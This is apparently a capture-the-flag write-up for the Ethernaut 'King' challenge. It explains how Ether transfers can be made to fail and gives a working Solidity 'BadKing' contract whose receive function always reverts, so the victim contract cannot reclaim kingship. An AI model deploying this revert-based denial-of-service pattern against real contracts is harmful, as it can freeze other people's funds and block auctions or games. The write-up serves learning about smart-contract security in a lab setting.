# Day 9 - King

Every smart contract can have a simple Fallback function in order to receive Ethers from other contracts and wallets.
Each time your contract sends Ethers to another contract, you are depending on the other contract’s code to handle the transaction and determine the transaction’s success. **This means your valid transactions can arbitrarily fail.**

As the transaction sender, you are always susceptible to the following cases:

- **Loophole 1:** The receiving contract doesn’t have a payable fallback function, cannot receive Ethers, and will throw an error upon a payable request.

- **Loophole 2:** The receiving contract has a malicious payable fallback function that throws an exception and fails valid transactions.

- **Loophole 3:** The receiving contract has a malicious payable function that consumes a large amount of gas, which fails your transaction or over-consumes your gas limit.

## Solution

When you submit this `King.sol` instance back to level, Ethernaut will call this fallback function to regain Kingship. The key is to guarantee that Ethernaut’s transaction will fail, so you can remain King.

Notice inside this fallback function, there is a `king.transfer()`, which can fail if the current king is a malicious contract and refuses to withdraw.

Make sure to send at least 1 Ether to surpass the current prize

```js
pragma solidity ^0.6.0;
contract BadKing {
    event CallTheKing(bool success);

    // _victim is the contract address
    constructor(address payable _victim) public payable {
        (bool success,) = _victim.call{gas: 1000000, value: 1 ether}("");
        emit CallTheKing(success);
    }

    receive() external payable {
      revert("You failed! I am the king");
    }
}
```
